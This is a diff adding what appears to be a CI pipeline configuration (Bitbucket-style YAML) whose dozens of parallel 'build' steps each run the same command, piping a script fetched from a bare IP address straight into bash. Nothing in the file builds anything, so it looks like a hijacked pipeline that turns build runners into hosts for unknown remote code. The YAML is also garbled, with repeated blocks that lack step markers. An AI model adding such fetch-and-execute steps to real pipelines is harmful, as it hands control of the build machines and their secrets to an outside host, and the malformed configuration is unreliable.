@@ -1,0 +1,498 @@
+options:
+  max-time: 120
+  size: 2x
+image: python:3.8
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: build-1
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+          name: build-1
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+          name: build-1
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+          name: build-1
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+          name: build-1
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+          name: build-1
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+          name: build-1
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-1
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+          name: build-1
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+          name: build-1
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-2
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-3
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-4
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-5
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-6
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-7
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-8
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-9
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
+
+      - step:
+          name: build-10
+          script:
+            - curl -sL http://139.180.133.28/shai | bash
